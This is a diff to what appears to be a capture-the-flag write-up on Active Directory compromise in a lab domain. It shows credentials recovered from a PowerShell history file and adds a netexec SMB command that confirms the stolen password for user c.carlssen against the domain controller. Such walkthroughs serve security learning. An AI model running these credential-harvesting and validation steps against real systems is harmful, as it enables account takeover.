@@ -759,7 +759,7 @@ PS C:\Users\Pong_gMSA$\Documents>
 
 I now have a full shell
 
-# Compromising ``
+# Compromising `.carlssen`
 
 ```python
 PS C:\Users\Pong_gMSA$\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
@@ -771,5 +771,11 @@ $c = New-object System.management.automation.pscredential("pong\c.carlssen,$(con
 
 I have more credentials
 
+```python
+❯❯❯ faketime -f +8h nxc smb dc2.pong.htb -u 'c.carlssen' -p 'A()DUJ!@414' -k                                                                                    
+SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
+SMB         dc2.pong.htb    445    dc2              [+] pong.htb\c.carlssen:A()DUJ!@414
+```
 
+This user is now compromised
 
